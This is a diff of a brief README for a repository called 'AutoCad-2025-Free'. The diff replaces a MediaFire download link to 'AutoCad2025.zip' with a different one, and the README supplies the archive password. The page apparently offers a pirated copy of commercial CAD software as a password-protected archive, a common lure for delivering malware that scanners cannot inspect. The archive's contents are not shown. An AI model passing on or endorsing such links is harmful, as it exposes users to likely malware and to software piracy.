@@ -1,6 +1,6 @@
 # AutoCad-2025-Free
 
-[Click here to Download](https://www.mediafire.com/file/frb7l9pre3sn8my/AutoCad2025.zip/file)
+[Click here to Download](https://www.mediafire.com/file/bibqecm85ef42du/AutoCad2025.zip/file)
 
 [Pass : Educati0n4fr33@! ]
 
